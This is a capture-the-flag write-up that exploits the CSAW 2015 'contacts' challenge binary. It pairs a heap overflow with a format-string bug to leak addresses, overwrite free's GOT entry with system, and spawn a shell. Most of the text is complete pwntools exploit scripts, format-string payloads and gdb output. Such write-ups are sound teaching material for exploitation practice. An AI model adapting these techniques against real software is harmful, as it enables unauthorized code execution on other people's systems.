This writeup references this writeup:
```
http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-pwn250-contacts/
```

Let's taker a look at the binary:

```
$	file contacts_54f3188f64e548565bc1b87d7aa07427 
contacts_54f3188f64e548565bc1b87d7aa07427: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=a2c73697f9555c6be6c57478029e352df1f28cc8, stripped
$	checksec contacts_54f3188f64e548565bc1b87d7aa07427 
[*] '/Hackery/legacy/ctf/15csaw/contact/contacts_54f3188f64e548565bc1b87d7aa07427'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

So we can see that this is a 32 bit ELF, that has a stack canary and a Non-Executable stack on it. When we run the program, we see that it is a contacts manager. We can add, delete, remove, edit, and display contacts. Let's take a look at the code in IDA.

main (only part of) function:
```
LABEL_11:
  while ( option != 5 )
  {
    printf("%s", menu);
    __isoc99_scanf("%u%*c", &option);
    switch ( option )
    {
      case 1:
        create_contact((int)&contacts_heap);
        break;
      case 2:
        rm_contact(&contacts_heap);
        break;
      case 3:
        edit_contact(&contacts_heap);
        break;
      case 4:
        list_contact(&contacts_heap);
        break;
      default:
        puts("Invalid option");
        break;
      case 5:
        goto LABEL_11;
    }
  }
  puts("Thanks for trying out the demo, sadly your contacts are now erased");
  return 0;
```

So we can see here that this is essentially a menu, and that it launches a function for each option (except for the last, it just exits). For each function it passes the heaps tructure which stores the contacts as an argument. Let's take a look at the create function:

```
int __cdecl create_contact(int a1)
{
  int contact_heap_space; // [sp+18h] [bp-10h]@1
  signed int v3; // [sp+1Ch] [bp-Ch]@1

  contact_heap_space = a1;
  v3 = 0;
  while ( *(_DWORD *)(contact_heap_space + 76) && v3 <= 9 )
  {
    ++v3;
    contact_heap_space += 80;
  }
  puts("Contact info: ");
  request_name(contact_heap_space);
  request_phone(contact_heap_space);
  request_descr(contact_heap_space);
  *(_DWORD *)(contact_heap_space + 76) = 1;
  return dword_804B088++ + 1;
}
```

So we can see that this function takes essentially executes three seperate functions, each passing the heap structure as an argument. After that it set's an integer in the heap equal to 1. Let's see what the three functions do.
```
char *__cdecl request_name(int contact_heap_space)
{
  char *result; // eax@1

  printf("\tName: ");
  fgets((char *)(contact_heap_space + 8), 64, stdin);
  result = strchr((const char *)(contact_heap_space + 8), 10);
  if ( result )
  {
    result = strchr((const char *)(contact_heap_space + 8), 10);
    *result = 0;
  }
  return result;
}
```

So we can see that the first function just securely scans in 64 bytes worth of data into the name char array in the heap. No overflow here.
```
char *__cdecl request_descr(int contact_heap_space)
{
  char *result; // eax@3
  int player_description_length; // [sp+1Ch] [bp-Ch]@1

  printf("\tLength of description: ");
  __isoc99_scanf("%u%*c", &player_description_length);
  *(_DWORD *)(contact_heap_space + 72) = player_description_length;
  *(_DWORD *)contact_heap_space = malloc(player_description_length + 1);
  if ( !*(_DWORD *)contact_heap_space )
    exit(1);
  printf("\tEnter description:\n\t\t");
  fgets(*(char **)contact_heap_space, player_description_length + 1, stdin);
  result = *(char **)contact_heap_space;
  if ( !*(_DWORD *)contact_heap_space )
    exit(1);
  return result;
}
```  
So we can see here, that it prompts the user for how long the description will be, mallocs that amount of space, then securely scans it in to a char pointer with fgets. In addition to that it establishes an int equal to the length of the description.
```
char *__cdecl request_phone(int contact_heap_space)
{
  char *result; // eax@3

  printf("[DEBUG] Haven't written a parser for phone numbers; ");
  puts("You have 10 numbers");
  *(_DWORD *)(contact_heap_space + 4) = malloc(0xBu);
  if ( !*(_DWORD *)(contact_heap_space + 4) )
    exit(1);
  printf("\tEnter Phone No: ");
  fgets(*(char **)(contact_heap_space + 4), 11, stdin);
  result = strchr(*(const char **)(contact_heap_space + 4), 10);
  if ( result )
  {
    result = strchr(*(const char **)(contact_heap_space + 4), 10);
    *result = 0;
  }
  return result;
}
```

Here we can see it prompts the user for a phone number that, and securely scans it into a char pointer. With all of this information we can put together the heap structure.
```
char *description
char *phone_number
char name
int length
int enabled
```

So moving on, there are two pieces of code that interest us. The first is in the `edit_contact()` function:
```
  printf("1.Change name\n2.Change description\n>>> ");
  __isoc99_scanf("%u%*c", &option);
  if ( option == 1 )
  {
    printf("New name: ");
    fgets((char *)(contact_heap_space + 8), length_input, stdin);
    if ( strchr((const char *)(contact_heap_space + 8), 10) )
      *strchr((const char *)(contact_heap_space + 8), 10) = 0;
  }
```

As you can see here, this allows us to edit the user's name with fgets. However ther is nothing checking to see if the int `length_input` is greater than the space that it is copying to. So we have a heap overflow vulnerabillity here. The second is in a function called in the list_contact function:
```
int __cdecl sub_8048BD1(int name, int length, int phone, char *description)
{
  printf("\tName: %s\n", name);
  printf("\tLength %u\n", length);
  printf("\tPhone #: %s\n", phone);
  printf("\tDescription: ");
  return printf(description);
}
```

As we can see here it is using printf to print the description without formatting it. We control what the description is when we create or edit a contact. This is a classic format string exploit. Now it's just a matter of what we can do with these two exploits. First let's see what we can view with the format string exploit, and reach with the heap overflow using this python code:

```
#Import pwntools
from pwn import *

#Establish the process
target = process("./contacts_54f3188f64e548565bc1b87d7aa07427")

#Create the contact with the fmt string exploit as the description
target.recvuntil(">>>")
target.sendline("1")
target.sendline("guy")
target.sendline("0123456789")
target.sendline("50")
target.sendline("%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x.%9$x")
print target.recvuntil(">>>")

#Print the description
target.sendline("4")
print target.recvuntil(">>>")

#Drop to an interactive shell and hand the process over to gdb
gdb.attach(target)
target.interactive()
```

when we run it:
```
$	python fmt_recon.py 
[+] Starting local process './contacts_54f3188f64e548565bc1b87d7aa07427': pid 11500
 Contact info: 
    Name: [DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
    Enter Phone No:     Length of description:     Enter description:
        Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>>
 Contacts:
    Name: guy
    Length 50
    Phone #: 0123456789
    Description: 8da4010.f763d3cb.0.1.f7793000.ffe9a188.8048c99.804b0a8.32
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>>
[*] running in new terminal: /usr/bin/gdb -q  "/Hackery/legacy/ctf/15csaw/contact/contacts_54f3188f64e548565bc1b87d7aa07427" 11500
[+] Waiting for debugger: Done
[*] Switching to interactive mode
```

So we can see that the format string exploit did work. Let's take a look at gdb to see exactly what we got:

```
gdb-peda$ x/x 0x8da4010
0x8da4010:	0x33323130
gdb-peda$ x/s 0x8da4010
0x8da4010:	"0123456789"
```

So we can see that the first dword over contains a pointer to the phone number, which makes sense since it is right after the description pointer. Now let's look at the heap memory.
```
gdb-peda$ find %1
Searching for '%1' in: None ranges
Found 14 results, display max 14 items:
[heap] : 0x8da4020 ("%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x.%9$x\n")
  libc : 0xf75f52b8 (<__libc_start_main+312>:	and    eax,0xbcebc031)
  libc : 0xf7607a1c (<__open_catalog+188>:	and    eax,0x5b8c931)
  libc : 0xf761252e (and    eax,0x1f38c031)
  libc : 0xf761559e (and    eax,0x1f38c031)
  libc : 0xf765310b (and    eax,0xcf81c731)
  libc : 0xf76578b0 (<strchrnul+272>:	and    eax,0xcf81cf31)
  libc : 0xf7659f2a (<strxfrm_l+1978>:	and    eax,0xbebd231)
  libc : 0xf765aafa (<strxfrm_l+5002>:	and    eax,0xbebd231)
  libc : 0xf7722e3a (and    eax,0xfa83d631)
  libc : 0xf773db12 ("%10u\n")
  libc : 0xf773db2b ("%10u\n")
  libc : 0xf773db59 ("%10u\n")
  libc : 0xf773db72 ("%10lu\n")
gdb-peda$ find 0x8da4020
Searching for '0x8da4020' in: None ranges
Found 5 results, display max 5 items:
contacts_54f3188f64e548565bc1b87d7aa07427 : 0x804b0a0 --> 0x8da4020 ("%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x.%9$x\n")
                                  [stack] : 0xffe971bc --> 0x8da4020 ("%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x.%9$x\n")
                                  [stack] : 0xffe97640 --> 0x8da4020 ("%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x.%9$x\n")
                                  [stack] : 0xffe9a124 --> 0x8da4020 ("%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x.%9$x\n")
                                  [stack] : 0xffe9a130 --> 0x8da4020 ("%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x.%9$x\n")
gdb-peda$ x/x 0x804b0a0
0x804b0a0:	0x08da4020
gdb-peda$ x/20w 0x804b0a0
0x804b0a0:	0x08da4020	0x08da4010	0x00797567	0x00000000
0x804b0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b0c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b0d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b0e0:	0x00000000	0x00000000	0x00000032	0x00000001
```

So here we can see the entire heap space for the contact we created. It starts off with the dexcription pointer `0x8da4020`, then has the phone pointer `0x08da4010`, then the name char array, then has the length int 0x32 (hex for 50), and then the enabled int. So with the overflow we will be able to overwrite the two integers at the end, since they are the only things after that. However we can create a second contact, and use the first contact to overflow into the phone pointer for the second. Since we can view it with the format string, we will be able to write to the address. Since it only has partial RELRO, we can write to the GOT table. First let's find a function that we can overwrite to system.

```
      free(*(void **)contact_heap_space);
```

So after a bit of searching, the free function looks like a good canidate. It is only called twices, and not anywhere that should crash it before we can pop a shell. In addition to that, we can control the argument to it (it's the description of the user) so we can easily pass `/bin/sh` to it.

```
$	readelf -a contacts_54f3188f64e548565bc1b87d7aa07427 | grep free
0804b014  00000307 R_386_JUMP_SLOT   00000000   free@GLIBC_2.0
     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.0 (2)
```

So we can see that the GOT address for free is 0x804b014. Next we need to leak an address from the stack. We can do this by overflowing a phone number pointer with the got address of free. Let's figure out the overflow by editing the code above to add a second user (using the below code) and looking at gdb.

```
#Create the second contact
target.sendline("1")
target.sendline("guy1")
target.sendline("4685193270")
target.sendline("50")
target.sendline("1"*50)
print target.recvuntil(">>>")
```

onto gdb:
```
gdb-peda$ find %1
Searching for '%1' in: None ranges
Found 14 results, display max 14 items:
[heap] : 0x9f2d020 ("%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x.%9$x\n")
  libc : 0xf75b92b8 (<__libc_start_main+312>:	and    eax,0xbcebc031)
  libc : 0xf75cba1c (<__open_catalog+188>:	and    eax,0x5b8c931)
  libc : 0xf75d652e (and    eax,0x1f38c031)
  libc : 0xf75d959e (and    eax,0x1f38c031)
  libc : 0xf761710b (and    eax,0xcf81c731)
  libc : 0xf761b8b0 (<strchrnul+272>:	and    eax,0xcf81cf31)
  libc : 0xf761df2a (<strxfrm_l+1978>:	and    eax,0xbebd231)
  libc : 0xf761eafa (<strxfrm_l+5002>:	and    eax,0xbebd231)
  libc : 0xf76e6e3a (and    eax,0xfa83d631)
  libc : 0xf7701b12 ("%10u\n")
  libc : 0xf7701b2b ("%10u\n")
  libc : 0xf7701b59 ("%10u\n")
  libc : 0xf7701b72 ("%10lu\n")
gdb-peda$ find 0x9f2d020
Searching for '0x9f2d020' in: None ranges
Found 2 results, display max 2 items:
contacts_54f3188f64e548565bc1b87d7aa07427 : 0x804b0a0 --> 0x9f2d020 ("%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x.%9$x\n")
                                  [stack] : 0xfff1c2fc --> 0x9f2d020 ("%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x.%9$x\n")
gdb-peda$ x/x 0x804b0a0
0x804b0a0:	0x09f2d020
gdb-peda$ x/40w 0x804b0a0
0x804b0a0:	0x09f2d020	0x09f2d010	0x30797567	0x00000000
0x804b0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b0c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b0d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b0e0:	0x00000000	0x00000000	0x00000032	0x00000001
0x804b0f0:	0x09f2d068	0x09f2d058	0x31797567	0x00000000
0x804b100:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b110:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b120:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b130:	0x00000000	0x00000000	0x00000032	0x00000001
gdb-peda$ x/s 0x804b0a8
0x804b0a8:	"guy0"
gdb-peda$ x/s 0x804b0f8
0x804b0f8:	"guy1"
gdb-peda$ x/w 0x804b0f4
0x804b0f4:	0x09f2d058
gdb-peda$ x/s 0x9f2d058
0x9f2d058:	"4685193270"
gdb-peda$ x/x 0x804b0f0
0x804b0f0:	0x09f2d068
gdb-peda$ x/s 0x9f2d068
0x9f2d068:	'1' <repeats 50 times>
gdb-peda$ x/d 0x804b0e8
0x804b0e8:	50
gdb-peda$ x/d 0x804b0ec
0x804b0ec:	1
```

Time to do some math with python:
```
>>> 0x804b0f8 - 0x804b0a8
80
>>> 0x804b0f4 - 0x804b0a8
76
>>> 0x804b0f0 - 0x804b0a8
72
>>> 0x804b0ec - 0x804b0a8
68
>>> 0x804b0e8 - 0x804b0a8
64
```

So with all of that information we know that after 64 bytes of filler, we will reach the length interger, then the enabled integer, then the description pointer, then the phone number pointer, then finally the name  followed by a null byte. We will need to replace all of it with data that should be there, however we can change it such as editing the length. The reason why we have to write the name and the null byte is because there will be a newline character appended tio the end of whatever we write, so we have to ensure that it goes into unused space.  Convinietly, we have all of this information since the only piece that changes is the description pointer, which we get throug the printf leak. So our payload will look like this:
```
payload = "0"*64 + p32(0x4) + p32(0x1) + p32(description) + p32(0x804b014) + p32(0x31797567) "\x00"
```

Once we execute the payload, we will be able to Display the contacts and leak an address. However the address wil be among a bunch of other data, which will need to be sorted out. I found the address by splitting it into 8 byte segments, then unpacking it with pwntools and looking for an address I could use. It doesn't matter what address we get, as long as it is to a function. I ended up leaking the scanf address. Here is the code to do so.

```
#Import pwntools
from pwn import *

#Establish the process
target = process("./contacts_54f3188f64e548565bc1b87d7aa07427")

#Create the first contact
target.recvuntil(">>>")
target.sendline("1")
target.sendline("guy0")
target.sendline("0123456789")
target.sendline("50")
target.sendline("%1$x")
print target.recvuntil(">>>")

#Create the second contact 
target.sendline("1")
target.sendline("guy1")
target.sendline("4685790123")
target.sendline("50")
target.sendline("%1$x")
print target.recvuntil(">>>")

#Print the description, and grab the leaked addresses
target.sendline("4")
print target.recvuntil("Phone #: 0123456789\n")
leak0 = target.recvline()
print target.recvuntil("Phone #: 4685790123\n")
leak1 = target.recvline()
print target.recvuntil(">>>")

#Filter out the leaked addresses
leak0 = leak0.replace("Description: ", "")[1:]
leak1 = leak1.replace("Description: ", "")[1:]
leak0 = leak0.replace(" ", "")
leak1 = leak1.replace(" ", "")
leak0 = "0x" + leak0
leak1 = "0x" + leak1
leak0 = int(leak0, 16)
leak1 = int(leak1, 16)

#Edit the guy0 contact, and execute the heap overflow into guy1
target.sendline("3")
target.sendline("guy0")
target.sendline("1")
print target.recvuntil(">>>")
payload = "0"*64 + p32(0x5) + p32(0x1) + p32(leak1) + p32(0x804b014) + p32(0x31797567) + "\x00"
target.sendline(payload)
print target.recvuntil(">>>")

#Display the contacts to get the leak
target.sendline("4")
print target.recvuntil("Length 50\n")
leak2 = target.recvline()
print target.recvuntil(">>>")

#Filter out the address from the leak
leak2 = leak2.replace("Phone #:", "")[4:]
leak2 = hex(u64(leak2[39:]))
leak2 = leak2[3:]
leak2 = leak2[:-6]
leak2 = int("0x" + leak2, 16)
print hex(leak2)

#Print the needed information
print "leak0: " + hex(leak0)
print "leak1: " + hex(leak1)
print "leak2: " + hex(leak2)

#Drop to an interactive shell and hand the process over to gdb
gdb.attach(target)
target.interactive()
```

Now let's fnd the offset from system using the gdb session the python code spawns:

output of the python code:
```
leak0: 0x9d23010
leak1: 0x9d23058
leak2: 0xf759a610
```

gdb:
```
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7579060 <system>
```
calculate the difference:
```
>>> 0xf7579060 - 0xf759a610
-136624
```

So to get the system address, we should just have to subtract 136624 from the leaked address. Now that we have that, we have everything we need for the final exploit.

So how the exploit will work, is we will create five users. After that we will leak the heap addresses we need. The first user will overflow into the second so we can leak the scanf address. The third user will overflow into the fourth. We will execute the write with two sperate format strings, writing to both `0x804b014` and `0x804b016`, so we don't have to write so many bytes at once. After that change the description of the second and fourth users to `"%" + bytes + "x%1$hn"` where bytes is the number of bytes you need to write for the two byte segment. After that change the description of the fifth user to `/bin/sh`. Then we will display the contacts  write to the `free` got table entry with two writes, the first and last two byte segments.  After that we will be able to either delete or edit the description for the second user and we will have a shell. For the last two steps I choose to do them manually instead of automating them with the script:

exploit:
```
#Import pwntools
from pwn import *

#Establish the process
target = process("./contacts_54f3188f64e548565bc1b87d7aa07427")

#Create the first contact
target.recvuntil(">>>")
target.sendline("1")
target.sendline("guy0")
target.sendline("0123456789")
target.sendline("50")
target.sendline("%1$x")
print target.recvuntil(">>>")

#Create the second contact 
target.sendline("1")
target.sendline("guy1")
target.sendline("4685790123")
target.sendline("50")
target.sendline("%1$x")
print target.recvuntil(">>>")

#Create the third contact
target.sendline("1")
target.sendline("guy2")
target.sendline("1356984280")
target.sendline("50")
target.sendline("%1$x")
print target.recvuntil(">>>")

#Create the fourth contact
target.sendline("1")
target.sendline("guy3")
target.sendline("6310279584")
target.sendline("50")
target.sendline("%1$x")
print target.recvuntil(">>>")

#Create the fifth contact
target.sendline("1")
target.sendline("guy4")
target.sendline("2759830416")
target.sendline("50")
target.sendline("desc")
print target.recvuntil(">>>")

#Print the description, and grab the leaked addresses
target.sendline("4")
print target.recvuntil("Phone #: 0123456789\n")
hleak0 = target.recvline()
print target.recvuntil("Phone #: 4685790123\n")
hleak1 = target.recvline()
print target.recvuntil("Phone #: 1356984280\n")
hleak2 = target.recvline()
print target.recvuntil("Phone #: 6310279584\n")
hleak3 = target.recvline()
print target.recvuntil(">>>")

#Filter out the leaked addresses
hleak0 = hleak0.replace("Description: ", "")[1:]
hleak1 = hleak1.replace("Description: ", "")[1:]
hleak2 = hleak2.replace("Description: ", "")[1:]
hleak3 = hleak3.replace("Description: ", "")[1:]

hleak0 = hleak0.replace(" ", "")
hleak1 = hleak1.replace(" ", "")
hleak2 = hleak2.replace(" ", "")
hleak3 = hleak3.replace(" ", "")

hleak0 = "0x" + hleak0
hleak1 = "0x" + hleak1
hleak2 = "0x" + hleak2
hleak3 = "0x" + hleak3

hleak0 = int(hleak0, 16)
hleak1 = int(hleak1, 16)
hleak2 = int(hleak2, 16)
hleak3 = int(hleak3, 16)

#Edit the guy0 contact, and execute the heap overflow into guy1
target.sendline("3")
target.sendline("guy0")
target.sendline("1")
print target.recvuntil(">>>")
payload = "0"*64 + p32(0x4) + p32(0x1) + p32(hleak1 + 16) + p32(0x804b014) + p32(0x31797567) + "\x00"
target.sendline(payload)
print target.recvuntil(">>>")

#Display the contacts to get the leak
target.sendline("4")
print target.recvuntil("Length 50\n")
scanf_leak = target.recvline()
print target.recvuntil(">>>")

#Filter out the address from the leak
scanf_leak = scanf_leak.replace("Phone #:", "")[4:]
scanf_leak = hex(u64(scanf_leak[39:]))
scanf_leak = scanf_leak[3:]
scanf_leak = scanf_leak[:-6]
scanf_leak = int("0x" + scanf_leak, 16)

#Calculate the system address, and split it into the two seprate parts
sys_adr = scanf_leak - 136624
s1, s2 = hex(sys_adr)[:6], hex(sys_adr)[6:]
s2 = "0x" + s2
s1 = int(s1, 16)
s2 = int(s2, 16)

#Overflow guy2 into guy3
target.sendline("3")
target.sendline("guy2")
target.sendline("1")
print target.recvuntil(">>>")
payload = "1"*64 + p32(0x4) + p32(0x1) + p32(hleak2 + 16) + "\x16\xb0\x04\x08" + p32(0x33797567) + "\x00" 
target.send(payload)

#Change the descriptions of guy1 and guy3to the fmt string
target.sendline("3")
target.sendline("guy1")
target.sendline("2")
print target.recvuntil(">>>")
target.sendline("50")
target.sendline("%" + str(s2) + "x%1$hn")
print target.recvuntil(">>>")

target.sendline("3")
target.sendline("guy3")
target.sendline("2")
print target.recvuntil(">>>")
target.sendline("50")
target.sendline("%" + str(s1) + "x%1$hn")
#target.sendline("1234")
print target.recvuntil(">>>")

#Change the description of guy4 to /bin/sh
target.sendline("3")
target.sendline("guy4")
target.sendline("2")
print target.recvuntil(">>>")
target.sendline("50")
target.sendline("/bin/sh")
print target.recvuntil(">>>")

#Print the needed information
print "leak0: this has chaned" + hex(hleak0)
print "leak1: " + hex(hleak1)
print "scanf: " + hex(scanf_leak)
print "system: " + hex(sys_adr)
print "s1: " + hex(s1) + " " + str(s1)
print "s2: " + hex(s2) + " " + str(s2)

#Drop to an interactive shell and hand the process over to gdb
gdb.attach(target)
target.interactive()
```

running the script:
```
$	python exploit.py
```

once we get to the interactive shell:
```
[+] Waiting for debugger: Done
[*] Switching to interactive mode
 Length of description: Description: 
    Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> $ 4 
```

after the prinft exploit:
```
$ 3
                                                                                                                                                                                                                     804b016
    Name: guy4
    Length 50
    Phone #: 2759830416
    Description: /bin/sh
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> Name to change? $ guy4
1.Change name
2.Change description
>>> $ 2
$ ls
contacts_54f3188f64e548565bc1b87d7aa07427
core
exploit.py
flag.txt
fmt_recon.py
heap_recon.py
peda-session-contacts_54f3188f64e548565bc1b87d7aa07427.txt
peda-session-dash.txt
peda-session-ls.txt
peda-session-w.procps.txt
Readme.md
working.py
$ cat flag.txt
flag{f0rm47_s7r1ng5_4r3_fun_57uff}
$  
```

just like that, we pwned the binary
  
  